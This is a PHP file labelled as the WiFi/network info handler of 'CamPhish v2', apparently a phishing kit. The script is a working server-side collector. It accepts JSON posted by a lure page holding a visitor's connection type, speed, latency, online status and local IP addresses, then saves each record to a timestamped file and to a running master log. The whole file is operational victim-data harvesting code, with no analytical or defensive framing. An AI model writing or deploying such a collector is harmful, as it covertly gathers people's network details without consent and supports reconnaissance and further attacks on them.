<?php
// CamPhish v2 — WiFi/Network Info Handler

if (isset($_POST['wifi'])) {
    $date = date('dMYHis');
    $data = json_decode($_POST['wifi'], true);
    
    if ($data && is_array($data)) {
        $output = "=== WiFi/Network Info ===\n";
        $output .= "Timestamp: " . date('Y-m-d H:i:s') . "\n";
        $output .= "---\n";
        $output .= "Connection Type: " . ($data['connectionType'] ?? 'Unknown') . "\n";
        $output .= "Effective Type: " . ($data['effectiveType'] ?? 'Unknown') . "\n";
        $output .= "Network Type: " . ($data['type'] ?? 'Unknown') . "\n";
        $output .= "Downlink: " . ($data['downlink'] ?? 'Unknown') . " Mbps\n";
        $output .= "RTT: " . ($data['rtt'] ?? 'Unknown') . " ms\n";
        $output .= "Save Data: " . (($data['saveData'] ?? false) ? 'Yes' : 'No') . "\n";
        $output .= "Online: " . (($data['online'] ?? false) ? 'Yes' : 'No') . "\n";
        
        if (isset($data['localIPs']) && !empty($data['localIPs'])) {
            $output .= "Local IPs: " . implode(', ', $data['localIPs']) . "\n";
        }
        $output .= "===========================\n\n";
        
        // Save individual file
        $file = 'wifi_' . $date . '.txt';
        file_put_contents($file, $output);
        
        // Append to master
        file_put_contents('saved.wifi_info.txt', $output, FILE_APPEND);
        
        echo json_encode(['status' => 'success']);
    }
} else {
    echo json_encode(['status' => 'error']);
}
exit();
?>
